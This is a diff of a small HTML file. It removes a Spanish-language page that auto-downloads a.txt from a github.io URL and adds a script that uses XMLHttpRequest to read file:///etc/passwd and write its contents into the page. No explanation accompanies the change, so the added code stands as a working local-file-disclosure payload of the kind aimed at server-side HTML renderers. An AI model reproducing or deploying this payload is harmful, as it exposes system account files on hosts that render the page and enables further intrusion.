@@ -1,19 +1,15 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>Descarga Automática</title>
-    <script type="text/javascript">
-        window.onload = function() {
-            var link = document.createElement('a');
-            link.href = 'https://cuentaama.github.io/a.txt';
-            link.download = 'a.txt';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        };
-    </script>
-</head>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
 <body>
-    <h1>Descarga Iniciará Automáticamente</h1>
-</body>
-</html>
+
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","file:///etc/passwd");
+x.send();
+</script>
+
+</body></html>
